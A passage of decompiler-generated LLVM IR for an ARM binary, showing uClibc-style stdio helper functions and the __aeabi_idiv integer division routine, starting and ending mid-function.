  br i1 %v2_1bb1c, label %bb8, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_1bb14, i32* @r4, align 4
  ret i32 0

bb8:                                              ; preds = %entry
  %v1_1bb2c = icmp slt i32 %arg2, 0
  %v2_1bb2c = icmp eq i32 %arg2, 0
  store i1 %v2_1bb2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_1bb2c, label %bb9, label %bb10

bb9:                                              ; preds = %bb8
  store i32 2147483647, i32* @r2, align 4
  br label %bb10

bb10:                                             ; preds = %bb8, %bb9
  %v1_1bb34 = add i32 %tmp, 4
  %v2_1bb34 = inttoptr i32 %v1_1bb34 to i32*
  %v3_1bb34 = load i32, i32* %v2_1bb34, align 4
  store i32 %v3_1bb34, i32* %r0.global-to-local, align 4
  %v1_1bb38 = call i32 @__libc_read(i32 %v3_1bb34)
  store i32 %v1_1bb38, i32* %r0.global-to-local, align 4
  %v2_1bb3c = icmp eq i32 %v1_1bb38, 0
  store i1 %v2_1bb3c, i1* %cpsr_z.global-to-local, align 1
  %tmp11 = icmp slt i32 %v1_1bb38, 1
  br i1 %tmp11, label %bb13, label %bb12

bb12:                                             ; preds = %bb10
  %v7_1bb40 = load i32, i32* %stack_var_-12, align 4
  store i32 %v7_1bb40, i32* @r4, align 4
  ret i32 %v1_1bb38

bb13:                                             ; preds = %bb10
  %v0_1bb44 = load i32, i32* @r4, align 4
  %v1_1bb44 = inttoptr i32 %v0_1bb44 to i32*
  %v2_1bb44 = load i32, i32* %v1_1bb44, align 4
  %v1_1bb48 = or i32 %v2_1bb44, 8
  store i32 %v1_1bb48, i32* %r1.global-to-local, align 4
  %v1_1bb4c = or i32 %v2_1bb44, 4
  store i32 %v1_1bb4c, i32* %r3.global-to-local, align 4
  %v3_1bb50 = sdiv i32 %v2_1bb44, 256
  store i32 %v3_1bb50, i32* %ip.global-to-local, align 4
  br i1 %v2_1bb3c, label %.thread, label %bb14

bb14:                                             ; preds = %bb13
  %v1_1bb58 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_1bb58, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread:                                          ; preds = %bb13
  %v2_1bb5c = trunc i32 %v3_1bb50 to i8
  %v4_1bb5c = add i32 %v0_1bb44, 1
  %v5_1bb5c = inttoptr i32 %v4_1bb5c to i8*
  store i8 %v2_1bb5c, i8* %v5_1bb5c, align 1
  %v0_1bb60.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1bb60.pr, label %.thread1, label %.thread2

.thread1:                                         ; preds = %.thread
  %v1_1bb60 = load i32, i32* %r3.global-to-local, align 4
  %v2_1bb60 = trunc i32 %v1_1bb60 to i8
  %v3_1bb60 = load i32, i32* @r4, align 4
  %v4_1bb60 = inttoptr i32 %v3_1bb60 to i8*
  store i8 %v2_1bb60, i8* %v4_1bb60, align 1
  %v0_1bb64.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1bb64.pr.pr, label %.thread3, label %.thread2

.thread2:                                         ; preds = %bb14, %.thread, %.thread1
  %v1_1bb64 = load i32, i32* %ip.global-to-local, align 4
  %v2_1bb64 = trunc i32 %v1_1bb64 to i8
  %v3_1bb64 = load i32, i32* @r4, align 4
  %v4_1bb64 = add i32 %v3_1bb64, 1
  %v5_1bb64 = inttoptr i32 %v4_1bb64 to i8*
  store i8 %v2_1bb64, i8* %v5_1bb64, align 1
  %v0_1bb68.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1bb68.pr, label %.thread3, label %bb15

bb15:                                             ; preds = %.thread2
  %v1_1bb68 = load i32, i32* %r1.global-to-local, align 4
  %v2_1bb68 = trunc i32 %v1_1bb68 to i8
  %v3_1bb68 = load i32, i32* @r4, align 4
  %v4_1bb68 = inttoptr i32 %v3_1bb68 to i8*
  store i8 %v2_1bb68, i8* %v4_1bb68, align 1
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %.thread2, %bb15
  %v2_1bb6c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1bb6c, i32* @r4, align 4
  %v11_1bb6c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_1bb6c

; uselistorder directives
  uselistorder i32 %v3_1bb50, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 1, 5, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 (i32)* @__libc_read, { 1, 0 }
  uselistorder i32 2147483647, { 2, 3, 0, 1 }
  uselistorder i32* @r2, { 81, 11, 82, 83, 10, 84, 85, 86, 87, 12, 27, 28, 29, 88, 89, 90, 50, 6, 51, 91, 92, 94, 95, 96, 97, 99, 100, 101, 102, 52, 53, 13, 7, 147, 148, 149, 150, 103, 104, 2, 105, 108, 109, 106, 107, 8, 123, 110, 15, 16, 151, 3, 152, 158, 159, 163, 153, 133, 39, 40, 154, 135, 139, 140, 143, 141, 142, 136, 137, 138, 132, 14, 124, 160, 19, 54, 111, 112, 113, 98, 1, 161, 5, 162, 114, 115, 116, 117, 9, 118, 119, 4, 120, 0, 121, 122, 93, 69, 70, 66, 17, 18, 30, 155, 156, 157, 31, 32, 33, 34, 35, 36, 37, 38, 41, 42, 43, 44, 45, 46, 47, 48, 49, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 67, 68, 20, 21, 22, 23, 24, 25, 26, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 125, 126, 127, 128, 129, 130, 131, 134, 144, 145, 146 }
  uselistorder label %.thread3, { 2, 1, 0 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1bb70 = load i32, i32* @r4, align 4
  store i32 %v3_1bb70, i32* %stack_var_-8, align 4
  %v1_1bb74 = add i32 %arg1, 8
  %v1_1bb78 = inttoptr i32 %v1_1bb74 to i32*
  %v2_1bb78 = load i32, i32* %v1_1bb78, align 4
  store i32 %v2_1bb78, i32* @r1, align 4
  %v3_1bb78 = add i32 %arg1, 12
  %v4_1bb78 = inttoptr i32 %v3_1bb78 to i32*
  %v5_1bb78 = load i32, i32* %v4_1bb78, align 4
  %v2_1bb7c = sub i32 %v5_1bb78, %v2_1bb78
  store i32 %v2_1bb7c, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_1bb84 = inttoptr i32 %arg1 to i8*
  %v4_1bb84 = call i32 @__stdio_READ(i8* %v3_1bb84, i32 %v2_1bb78, i32 %v2_1bb7c)
  %v0_1bb88 = load i32, i32* @r4, align 4
  %v1_1bb88 = add i32 %v0_1bb88, 8
  %v2_1bb88 = inttoptr i32 %v1_1bb88 to i32*
  %v3_1bb88 = load i32, i32* %v2_1bb88, align 4
  store i32 %v3_1bb88, i32* %r2.global-to-local, align 4
  %v2_1bb8c = add i32 %v3_1bb88, %v4_1bb84
  %v2_1bb90 = add i32 %v0_1bb88, 20
  %v3_1bb90 = inttoptr i32 %v2_1bb90 to i32*
  store i32 %v2_1bb8c, i32* %v3_1bb90, align 4
  %v0_1bb94 = load i32, i32* %r2.global-to-local, align 4
  %v1_1bb94 = load i32, i32* @r4, align 4
  %v2_1bb94 = add i32 %v1_1bb94, 16
  %v3_1bb94 = inttoptr i32 %v2_1bb94 to i32*
  store i32 %v0_1bb94, i32* %v3_1bb94, align 4
  %v2_1bb98 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1bb98, i32* @r4, align 4
  ret i32 %v4_1bb84

; uselistorder directives
  uselistorder i32 %v4_1bb84, { 1, 0 }
  uselistorder i32 20, { 24, 25, 6, 26, 27, 28, 29, 0, 30, 37, 4, 38, 1, 5, 31, 32, 12, 22, 13, 7, 2, 8, 33, 34, 35, 36, 14, 15, 16, 17, 18, 19, 20, 21, 3, 9, 10, 11, 23 }
  uselistorder i32 12, { 11, 12, 41, 42, 43, 0, 44, 7, 45, 18, 46, 47, 13, 3, 48, 14, 9, 73, 74, 75, 76, 77, 78, 10, 79, 80, 81, 82, 83, 84, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 5, 4, 59, 60, 61, 15, 19, 35, 39, 20, 21, 67, 68, 69, 1, 70, 8, 71, 2, 72, 16, 63, 64, 65, 66, 85, 6, 62, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 37, 17, 38, 40 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1bb9c = load i32, i32* @r4, align 4
  store i32 %v3_1bb9c, i32* %stack_var_-12, align 4
  %v0_1bba0 = load i32, i32* @r0, align 4
  %v1_1bba0 = inttoptr i32 %v0_1bba0 to i8*
  %v2_1bba0 = load i8, i8* %v1_1bba0, align 1
  %v3_1bba0 = zext i8 %v2_1bba0 to i32
  store i32 %v3_1bba0, i32* %r2.global-to-local, align 4
  %v1_1bba4 = add i32 %v0_1bba0, 1
  %v2_1bba4 = inttoptr i32 %v1_1bba4 to i8*
  %v3_1bba4 = load i8, i8* %v2_1bba4, align 1
  %v4_1bba4 = zext i8 %v3_1bba4 to i32
  store i32 %v4_1bba4, i32* %r3.global-to-local, align 4
  %v4_1bba8 = mul nuw nsw i32 %v4_1bba4, 256
  %v5_1bba8 = or i32 %v4_1bba8, %v3_1bba0
  store i32 %v5_1bba8, i32* %r2.global-to-local, align 4
  %v1_1bbac = load i32, i32* @r1, align 4
  %v2_1bbac = and i32 %v1_1bbac, %v5_1bba8
  %v4_1bbac = icmp eq i32 %v2_1bbac, 0
  store i32 %v0_1bba0, i32* @r4, align 4
  br i1 %v4_1bbac, label %dec_label_pc_1bbb8, label %dec_label_pc_1bbd0

dec_label_pc_1bbb8:                               ; preds = %entry
  %v1_1bbb8 = and i32 %v5_1bba8, 2176
  %v2_1bbb8 = icmp eq i32 %v1_1bbb8, 0
  br i1 %v2_1bbb8, label %dec_label_pc_1bbc0, label %dec_label_pc_1bbe4

dec_label_pc_1bbc0:                               ; preds = %dec_label_pc_1bbb8
  %v2_1bbc0 = or i32 %v1_1bbac, %v5_1bba8
  store i32 %v2_1bbc0, i32* %r2.global-to-local, align 4
  %v3_1bbc4 = sdiv i32 %v2_1bbc0, 256
  store i32 %v3_1bbc4, i32* %r3.global-to-local, align 4
  %v1_1bbc8 = trunc i32 %v3_1bbc4 to i8
  store i8 %v1_1bbc8, i8* %v2_1bba4, align 1
  %v0_1bbcc = load i32, i32* %r2.global-to-local, align 4
  %v1_1bbcc = trunc i32 %v0_1bbcc to i8
  %v2_1bbcc = load i32, i32* @r0, align 4
  %v3_1bbcc = inttoptr i32 %v2_1bbcc to i8*
  store i8 %v1_1bbcc, i8* %v3_1bbcc, align 1
  %v0_1bbd0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1bbd0

dec_label_pc_1bbd0:                               ; preds = %entry, %dec_label_pc_1bbc0
  %v0_1bbd0 = phi i32 [ %v0_1bba0, %entry ], [ %v0_1bbd0.pre, %dec_label_pc_1bbc0 ]
  %v1_1bbd0 = inttoptr i32 %v0_1bbd0 to i8*
  %v2_1bbd0 = load i8, i8* %v1_1bbd0, align 1
  %v3_1bbd0 = zext i8 %v2_1bbd0 to i32
  store i32 %v3_1bbd0, i32* %r2.global-to-local, align 4
  %v1_1bbd4 = add i32 %v0_1bbd0, 1
  %v2_1bbd4 = inttoptr i32 %v1_1bbd4 to i8*
  %v3_1bbd4 = load i8, i8* %v2_1bbd4, align 1
  %v4_1bbd4 = zext i8 %v3_1bbd4 to i32
  %v4_1bbd8 = mul nuw nsw i32 %v4_1bbd4, 256
  %v5_1bbd8 = or i32 %v4_1bbd8, %v3_1bbd0
  store i32 %v5_1bbd8, i32* %r3.global-to-local, align 4
  %v1_1bbdc = and i32 %v3_1bbd0, 16
  store i32 %v1_1bbdc, i32* %r5.global-to-local, align 4
  %v2_1bbdc = icmp eq i32 %v1_1bbdc, 0
  br i1 %v2_1bbdc, label %dec_label_pc_1bc0c, label %dec_label_pc_1bbe4

dec_label_pc_1bbe4:                               ; preds = %dec_label_pc_1bbb8, %dec_label_pc_1bbd0
  %v0_1bbe4 = call i32 @__errno_location()
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_1bbec = inttoptr i32 %v0_1bbe4 to i32*
  store i32 9, i32* %v2_1bbec, align 4
  br label %dec_label_pc_1bbf0

dec_label_pc_1bbf0:                               ; preds = %dec_label_pc_1bc14, %dec_label_pc_1bbe4
  %v0_1bbf0 = load i32, i32* @r4, align 4
  %v1_1bbf0 = inttoptr i32 %v0_1bbf0 to i32*
  %v2_1bbf0 = load i32, i32* %v1_1bbf0, align 4
  %v1_1bbf4 = or i32 %v2_1bbf0, 8
  store i32 %v1_1bbf4, i32* %r3.global-to-local, align 4
  %v3_1bbf8 = sdiv i32 %v2_1bbf0, 256
  store i32 %v3_1bbf8, i32* %r2.global-to-local, align 4
  %v1_1bc00 = trunc i32 %v3_1bbf8 to i8
  %v3_1bc00 = add i32 %v0_1bbf0, 1
  %v4_1bc00 = inttoptr i32 %v3_1bc00 to i8*
  store i8 %v1_1bc00, i8* %v4_1bc00, align 1
  %v0_1bc04 = load i32, i32* %r3.global-to-local, align 4
  %v1_1bc04 = trunc i32 %v0_1bc04 to i8
  %v2_1bc04 = load i32, i32* @r4, align 4
  %v3_1bc04 = inttoptr i32 %v2_1bc04 to i8*
  store i8 %v1_1bc04, i8* %v3_1bc04, align 1
  %v2_1bc08 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1bc08, i32* @r4, align 4
  ret i32 -1

dec_label_pc_1bc0c:                               ; preds = %dec_label_pc_1bbd0
  %v1_1bc0c = and i32 %v3_1bbd0, 64
  %v2_1bc0c = icmp eq i32 %v1_1bc0c, 0
  br i1 %v2_1bc0c, label %dec_label_pc_1bc3c, label %dec_label_pc_1bc14

dec_label_pc_1bc14:                               ; preds = %dec_label_pc_1bc0c
  %v0_1bc14 = call i32 @__stdio_wcommit()
  %v2_1bc18 = icmp eq i32 %v0_1bc14, 0
  br i1 %v2_1bc18, label %dec_label_pc_1bc20, label %dec_label_pc_1bbf0

dec_label_pc_1bc20:                               ; preds = %dec_label_pc_1bc14
  %v0_1bc20 = load i32, i32* @r4, align 4
  %v1_1bc20 = inttoptr i32 %v0_1bc20 to i32*
  %v2_1bc20 = load i32, i32* %v1_1bc20, align 4
  store i32 %v2_1bc20, i32* %r3.global-to-local, align 4
  %v1_1bc24 = add i32 %v0_1bc20, 8
  %v2_1bc24 = inttoptr i32 %v1_1bc24 to i32*
  %v3_1bc24 = load i32, i32* %v2_1bc24, align 4
  store i32 %v3_1bc24, i32* %r2.global-to-local, align 4
  %v1_1bc28 = and i32 %v2_1bc20, -65
  store i32 %v1_1bc28, i32* %r3.global-to-local, align 4
  %v3_1bc2c = sdiv i32 %v2_1bc20, 256
  store i32 %v3_1bc2c, i32* %r1.global-to-local, align 4
  %v2_1bc30 = add i32 %v0_1bc20, 28
  %v3_1bc30 = inttoptr i32 %v2_1bc30 to i32*
  store i32 %v3_1bc24, i32* %v3_1bc30, align 4
  %v0_1bc34 = load i32, i32* %r1.global-to-local, align 4
  %v1_1bc34 = trunc i32 %v0_1bc34 to i8
  %v2_1bc34 = load i32, i32* @r4, align 4
  %v3_1bc34 = add i32 %v2_1bc34, 1
  %v4_1bc34 = inttoptr i32 %v3_1bc34 to i8*
  store i8 %v1_1bc34, i8* %v4_1bc34, align 1
  %v0_1bc38 = load i32, i32* %r3.global-to-local, align 4
  %v1_1bc38 = trunc i32 %v0_1bc38 to i8
  %v2_1bc38 = load i32, i32* @r4, align 4
  %v3_1bc38 = inttoptr i32 %v2_1bc38 to i8*
  store i8 %v1_1bc38, i8* %v3_1bc38, align 1
  %v0_1bc3c.pre = load i32, i32* @r4, align 4
  %v0_1bc48.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1bc3c

dec_label_pc_1bc3c:                               ; preds = %dec_label_pc_1bc0c, %dec_label_pc_1bc20
  %v0_1bc48 = phi i32 [ 0, %dec_label_pc_1bc0c ], [ %v0_1bc48.pre, %dec_label_pc_1bc20 ]
  %v2_1bc4c = phi i32 [ %v0_1bbd0, %dec_label_pc_1bc0c ], [ %v0_1bc3c.pre, %dec_label_pc_1bc20 ]
  %v1_1bc3c = inttoptr i32 %v2_1bc4c to i32*
  %v2_1bc3c = load i32, i32* %v1_1bc3c, align 4
  %v1_1bc40 = or i32 %v2_1bc3c, 1
  store i32 %v1_1bc40, i32* %r3.global-to-local, align 4
  %v3_1bc44 = sdiv i32 %v2_1bc3c, 256
  store i32 %v3_1bc44, i32* %r2.global-to-local, align 4
  %v1_1bc4c = trunc i32 %v3_1bc44 to i8
  %v3_1bc4c = add i32 %v2_1bc4c, 1
  %v4_1bc4c = inttoptr i32 %v3_1bc4c to i8*
  store i8 %v1_1bc4c, i8* %v4_1bc4c, align 1
  %v0_1bc50 = load i32, i32* %r3.global-to-local, align 4
  %v1_1bc50 = trunc i32 %v0_1bc50 to i8
  %v2_1bc50 = load i32, i32* @r4, align 4
  %v3_1bc50 = inttoptr i32 %v2_1bc50 to i8*
  store i8 %v1_1bc50, i8* %v3_1bc50, align 1
  %v2_1bc54 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1bc54, i32* @r4, align 4
  ret i32 %v0_1bc48

; uselistorder directives
  uselistorder i32 %v3_1bc44, { 1, 0 }
  uselistorder i32 %v3_1bbf8, { 1, 0 }
  uselistorder i32 %v3_1bbd0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1bbd0, { 0, 2, 1 }
  uselistorder i32 %v3_1bbc4, { 1, 0 }
  uselistorder i32 %v5_1bba8, { 0, 2, 1, 3 }
  uselistorder i32 28, { 21, 22, 5, 6, 7, 23, 24, 25, 26, 38, 27, 29, 8, 28, 1, 30, 2, 31, 32, 33, 34, 35, 36, 0, 37, 16, 17, 18, 3, 4, 19, 13, 12, 10, 11, 14, 15, 9, 20 }
  uselistorder i32 ()* @__stdio_wcommit, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 64, { 5, 0, 6, 7, 8, 9, 10, 11, 12, 1, 2, 13, 3, 14, 4 }
  uselistorder i32 9, { 16, 21, 22, 23, 24, 25, 26, 17, 27, 28, 18, 29, 30, 31, 32, 33, 0, 15, 12, 13, 14, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 19, 20 }
  uselistorder i32 ()* @__errno_location, { 48, 47, 46, 73, 72, 71, 45, 44, 43, 42, 41, 14, 18, 31, 39, 38, 27, 56, 11, 10, 9, 24, 8, 23, 75, 55, 54, 62, 61, 70, 69, 68, 17, 53, 26, 29, 57, 52, 16, 33, 50, 63, 30, 34, 37, 36, 35, 0, 15, 40, 7, 6, 67, 32, 28, 66, 22, 5, 13, 1, 21, 12, 2, 51, 20, 19, 65, 64, 4, 3, 60, 59, 58, 74, 49, 25 }
  uselistorder i32* @r1, { 85, 86, 87, 88, 1, 89, 90, 91, 92, 93, 96, 94, 95, 9, 10, 22, 97, 98, 99, 100, 101, 102, 103, 104, 3, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 4, 64, 65, 13, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 6, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 5, 207, 208, 11, 119, 120, 121, 122, 123, 124, 125, 126, 127, 139, 14, 18, 19, 209, 2, 210, 78, 79, 150, 27, 28, 212, 151, 156, 157, 160, 158, 159, 152, 153, 154, 155, 211, 80, 15, 140, 146, 148, 147, 213, 214, 215, 128, 129, 130, 16, 131, 141, 142, 143, 144, 145, 7, 8, 12, 132, 133, 134, 0, 135, 136, 137, 17, 138, 21, 105, 81, 82, 20, 23, 24, 25, 26, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 83, 84, 149 }
  uselistorder label %dec_label_pc_1bc3c, { 1, 0 }
  uselistorder label %dec_label_pc_1bbe4, { 1, 0 }
  uselistorder label %dec_label_pc_1bbd0, { 1, 0 }
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_1bc58 = icmp slt i32 %arg2, 0
  %v2_1bc58 = icmp eq i32 %arg2, 0
  %v0_1bc5c = load i32, i32* @r0, align 4
  %v2_1bc5c = xor i32 %v0_1bc5c, %arg2
  br i1 %v2_1bc58, label %dec_label_pc_1bd70, label %dec_label_pc_1bc64

dec_label_pc_1bc64:                               ; preds = %entry
  br i1 %v1_1bc58, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_1bc64
  %v2_1bc64 = sub i32 0, %arg2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_1bc64, %bb
  %v1_1bd30 = phi i32 [ %v2_1bc64, %bb ], [ %arg2, %dec_label_pc_1bc64 ]
  %v1_1bc68 = add i32 %v1_1bd30, -1
  %v7_1bc68 = icmp eq i32 %v1_1bd30, 1
  br i1 %v7_1bc68, label %dec_label_pc_1bd10, label %dec_label_pc_1bc70

dec_label_pc_1bc70:                               ; preds = %thread-pre-split
  %v1_1bc70 = icmp slt i32 %v0_1bc5c, 0
  br i1 %v1_1bc70, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_1bc70
  %v2_1bc74 = sub i32 0, %v0_1bc5c
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_1bc70, %bb85
  %v0_1bd64 = phi i32 [ %v0_1bc5c, %dec_label_pc_1bc70 ], [ %v2_1bc74, %bb85 ]
  %v3_1bc78 = icmp uge i32 %v0_1bd64, %v1_1bd30
  %v9_1bc78 = icmp eq i32 %v0_1bd64, %v1_1bd30
  %v2_1bc7c = xor i1 %v3_1bc78, true
  %v3_1bc7c = or i1 %v9_1bc78, %v2_1bc7c
  br i1 %v3_1bc7c, label %dec_label_pc_1bd1c, label %dec_label_pc_1bc80

dec_label_pc_1bc80:                               ; preds = %bb86
  %v2_1bc80 = and i32 %v1_1bc68, %v1_1bd30
  %v4_1bc80 = icmp eq i32 %v2_1bc80, 0
  br i1 %v4_1bc80, label %dec_label_pc_1bd2c, label %dec_label_pc_1bc88

dec_label_pc_1bc88:                               ; preds = %dec_label_pc_1bc80
  %v3_1bc88 = icmp ult i32 %v1_1bd30, 536870912
  br i1 %v3_1bc88, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1bc88
  %v4_1bc8c = mul i32 %v1_1bd30, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1bc88, %.thread
  %v0_1bcac.pr40.ph = phi i32 [ %v4_1bc8c, %.thread ], [ %v1_1bd30, %dec_label_pc_1bc88 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1bc88 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_1bcac.pr40 = phi i32 [ %v4_1bca0, %bb89 ], [ %v0_1bcac.pr40.ph, %.preheader.preheader ]
  %v1_1bca4 = phi i32 [ %v4_1bca4, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_1bc98 = icmp ugt i32 %v0_1bcac.pr40, 268435455
  br i1 %v2_1bc98, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_1bcacthread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_1bc9c = icmp ult i32 %v0_1bcac.pr40, %v0_1bd64
  br i1 %v4_1bc9c, label %bb88, label %dec_label_pc_1bcacthread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_1bca0 = and i32 %v0_1bcac.pr40, 268435456
  %v3_1bca0 = icmp eq i32 %v2_1bca0, 0
  %v4_1bca0 = mul i32 %v0_1bcac.pr40, 16
  br i1 %v3_1bca0, label %bb89, label %dec_label_pc_1bcac.loopexit

bb89:                                             ; preds = %bb88
  %v2_1bca4 = and i32 %v1_1bca4, 268435456
  %v3_1bca4 = icmp eq i32 %v2_1bca4, 0
  %v4_1bca4 = mul i32 %v1_1bca4, 16
  br i1 %v3_1bca4, label %.preheader, label %dec_label_pc_1bcacthread-pre-split.loopexit.loopexit

dec_label_pc_1bcacthread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_1bcb852.ph = phi i32 [ %v1_1bca4, %bb87 ], [ %v4_1bca4, %bb89 ]
  %v0_1bcac.pr42.ph = phi i32 [ %v0_1bcac.pr40, %bb87 ], [ %v4_1bca0, %bb89 ]
  br label %dec_label_pc_1bcacthread-pre-split.loopexit

dec_label_pc_1bcacthread-pre-split.loopexit:      ; preds = %dec_label_pc_1bcacthread-pre-split.loopexit.loopexit, %.thread3
  %v1_1bcb852 = phi i32 [ %v1_1bca4, %.thread3 ], [ %v1_1bcb852.ph, %dec_label_pc_1bcacthread-pre-split.loopexit.loopexit ]
  %v0_1bcac.pr42 = phi i32 [ %v0_1bcac.pr40, %.thread3 ], [ %v0_1bcac.pr42.ph, %dec_label_pc_1bcacthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1bcacthread-pre-split

dec_label_pc_1bcacthread-pre-split:               ; preds = %dec_label_pc_1bcacthread-pre-split.loopexit, %bb91
  %v1_1bcb850 = phi i32 [ %v1_1bcb852, %dec_label_pc_1bcacthread-pre-split.loopexit ], [ %v3_1bcb8, %bb91 ]
  %v2_1bcb048 = phi i32 [ %v0_1bd64, %dec_label_pc_1bcacthread-pre-split.loopexit ], [ %v2_1bcb0, %bb91 ]
  %v0_1bcac.pr = phi i32 [ %v0_1bcac.pr42, %dec_label_pc_1bcacthread-pre-split.loopexit ], [ %v3_1bcb4, %bb91 ]
  br label %dec_label_pc_1bcac

dec_label_pc_1bcac.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_1bcac

dec_label_pc_1bcac:                               ; preds = %dec_label_pc_1bcac.loopexit, %dec_label_pc_1bcacthread-pre-split
  %v1_1bcb8 = phi i32 [ %v1_1bcb850, %dec_label_pc_1bcacthread-pre-split ], [ %v1_1bca4, %dec_label_pc_1bcac.loopexit ]
  %v2_1bcb0 = phi i32 [ %v2_1bcb048, %dec_label_pc_1bcacthread-pre-split ], [ %v0_1bd64, %dec_label_pc_1bcac.loopexit ]
  %v1_1bcb4 = phi i32 [ %v0_1bcac.pr, %dec_label_pc_1bcacthread-pre-split ], [ %v4_1bca0, %dec_label_pc_1bcac.loopexit ]
  %v2_1bcac = icmp slt i32 %v1_1bcb4, 0
  br i1 %v2_1bcac, label %dec_label_pc_1bcc0, label %bb90

bb90:                                             ; preds = %dec_label_pc_1bcac
  %v4_1bcb0 = icmp ult i32 %v1_1bcb4, %v2_1bcb0
  br i1 %v4_1bcb0, label %bb91, label %dec_label_pc_1bcc0

bb91:                                             ; preds = %bb90
  %v3_1bcb4 = mul i32 %v1_1bcb4, 2
  %v2_1bcb8 = icmp slt i32 %v1_1bcb8, 0
  %v3_1bcb8 = mul i32 %v1_1bcb8, 2
  br i1 %v2_1bcb8, label %dec_label_pc_1bcc0, label %dec_label_pc_1bcacthread-pre-split

dec_label_pc_1bcc0:                               ; preds = %bb90, %dec_label_pc_1bcac, %bb91
  %v2_1bccc63 = phi i32 [ %v3_1bcb8, %bb91 ], [ %v1_1bcb8, %bb90 ], [ %v1_1bcb8, %dec_label_pc_1bcac ]
  %v1_1bcc455 = phi i32 [ %v3_1bcb4, %bb91 ], [ %v1_1bcb4, %bb90 ], [ %v1_1bcb4, %dec_label_pc_1bcac ]
  br label %dec_label_pc_1bcc4

dec_label_pc_1bcc4:                               ; preds = %.thread13, %dec_label_pc_1bcc0
  %v1_1bcf8 = phi i32 [ %v4_1bcf8, %.thread13 ], [ %v2_1bccc63, %dec_label_pc_1bcc0 ]
  %v1_1bccc = phi i32 [ %v1_1bd08, %.thread13 ], [ 0, %dec_label_pc_1bcc0 ]
  %v1_1bcfc = phi i32 [ %v4_1bcfc, %.thread13 ], [ %v1_1bcc455, %dec_label_pc_1bcc0 ]
  %v1_1bcc8 = phi i32 [ %v0_1bcf4, %.thread13 ], [ %v0_1bd64, %dec_label_pc_1bcc0 ]
  %v3_1bcc4 = icmp ult i32 %v1_1bcc8, %v1_1bcfc
  br i1 %v3_1bcc4, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_1bcc4
  %v3_1bcc8 = sub i32 %v1_1bcc8, %v1_1bcfc
  %v3_1bccc = or i32 %v1_1bccc, %v1_1bcf8
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1bcc4, %bb92
  %v1_1bcd4 = phi i32 [ %v1_1bcc8, %dec_label_pc_1bcc4 ], [ %v3_1bcc8, %bb92 ]
  %v1_1bcd8 = phi i32 [ %v1_1bccc, %dec_label_pc_1bcc4 ], [ %v3_1bccc, %bb92 ]
  %v4_1bcd0 = udiv i32 %v1_1bcfc, 2
  %v6_1bcd0 = icmp ult i32 %v1_1bcd4, %v4_1bcd0
